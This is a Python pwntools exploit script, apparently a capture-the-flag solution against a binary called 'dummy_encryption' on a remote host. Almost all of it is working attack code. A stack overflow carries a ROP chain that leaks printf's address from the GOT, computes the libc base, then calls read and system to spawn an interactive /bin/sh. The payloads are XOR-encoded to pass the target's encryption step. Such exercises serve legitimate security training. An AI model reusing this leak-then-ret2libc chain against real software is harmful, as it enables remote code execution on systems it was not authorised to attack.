#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dummy_encryption')

host = args.HOST or '141.85.224.110'
port = int(args.PORT or 33177)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

key = 1
def decrypt(c,key):
    m=''
    for i in range(len(c)-1,0,-1):
        m=chr(ord(c[i])^ord(c[i-1]))+m
    m=chr(ord(c[0])^key)+m
    return m

io = start()

bss_addr = 0x0000000000601060
printf_got = 0x000000601028
#printf_off = 0x583f0
printf_off = 0x0000000000050cf0

exe_rop = ROP(exe)
exe_rop.printf(printf_got)
exe_rop.main()
log.info(exe_rop.dump())
log.info(exe_rop.chain())

# stage 1 - leak
stage1 = "A" * 128 + "B" * 8 + exe_rop.chain() + "XXXX"

msg = decrypt(stage1, key)
log.info("ENC: " + msg)

io.sendafter(":", str(len(stage1)));
io.sendafter(":", msg)
io.sendafter(":", str(key))

io.recvuntil('58585858')
recv =io.recvuntil('Enter').strip().replace('Enter', '')
printf_addr = u64(recv+"\x00\x00")
log.info(hex(printf_addr))

libc_addr = printf_addr - printf_off
log.info(hex(libc_addr))

# stage 2 - exploit ----------------------
#libc = ELF('/lib64/libc.so.6')
libc = ELF('./libc.so.6')
libc.address = libc_addr
rop = ROP(libc)
rop.read(0, bss_addr, 128)
rop.system(bss_addr)

log.info(rop.dump())

stage2 = "A" * 128 + "B" * 8 + rop.chain() + "XXXX"

msg = decrypt(stage2, key)
log.info("ENC: " + msg)

io.sendafter(":", str(len(stage2)));
io.sendafter(":", msg)
io.sendafter(":", str(key))
io.send('/bin/sh\x00')
io.interactive()

# type 'cat flag' and you won
